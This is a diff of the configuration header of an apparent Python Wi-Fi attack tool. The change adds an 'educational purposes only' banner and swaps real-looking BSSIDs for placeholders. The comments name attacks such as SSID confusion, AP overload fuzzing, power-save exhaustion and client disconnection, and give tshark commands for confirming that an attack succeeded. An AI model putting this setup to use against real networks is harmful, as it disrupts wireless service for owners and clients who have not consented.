@@ -1,4 +1,9 @@
 #!/usr/bin/env python3
+"""
+================================================================================
+FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
+================================================================================
+"""
 import subprocess
 import time
 import os
@@ -14,13 +19,13 @@ from multiprocessing import Process, Value
 
 # --- 1. TARGET DATA: MAIN NETWORK ---
 # BSSIDs of the network primarily being attacked and to which the target clients are connected.
-TARGET_BSSID_5GHZ = "64:67:72:81:9C:6E"
-TARGET_BSSID_2_4GHZ = "64:67:72:81:9C:6D"
+TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"
+TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:12"
 
 # --- 2. TARGET DATA: GUEST NETWORK (ONLY FOR 'ssid_confusion') ---
 # BSSID of the SECOND network (e.g., guest network) needed for the confusion attack.
 # MUST HAVE A DIFFERENT SSID THAN THE MAIN NETWORK!
-TARGET_BSSID_GASTNETZ = "82:67:72:81:9C:6F" # Example, please adapt
+TARGET_BSSID_GASTNETZ = "AA:BB:CC:DD:EE:13" # Example, please adapt
 
 # --- 3. OPTIONAL SCANNER ---
 # IMPORTANT: The scanner is MANDATORY for the 'ssid_confusion' attack!
@@ -117,8 +122,8 @@ ADAPTER_KONFIGURATION = {
 # --- METHOD 1: CHECK SUCCESS FOR AP ATTACKS (BEACON JITTER) ---
 # For attacks that overload the AP (open_auth, buffer_overflow_fuzzer, power_save_exhaustion).
 # INSTRUCTION: sudo tshark -i <monitor_iface> -Y "wlan.fc.type_subtype == 8 && wlan.addr == <TARGET_BSSID>" -T fields -e frame.time_delta_displayed
-#              sudo tshark -i wlan7mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == D4:86:60:A3:F9:6F" -T fields -e frame.time_delta_displayed
-#              sudo tshark -i wlan2mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == D4:86:60:A3:F9:6E" -T fields -e frame.time_delta_displayed
+#              sudo tshark -i wlan7mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == AA:BB:CC:DD:EE:11" -T fields -e frame.time_delta_displayed
+#              sudo tshark -i wlan2mon -Y "wlan.fc.type_subtype == 8 && wlan.addr == AA:BB:CC:DD:EE:12" -T fields -e frame.time_delta_displayed
 # RESULT: Values SIGNIFICANTLY larger than 0.1024 (e.g., 0.5, 1.2) indicate a successful attack.
 #
 # --- METHOD 2: CHECK SUCCESS FOR CLIENT DISCONNECTION ATTACKS ---
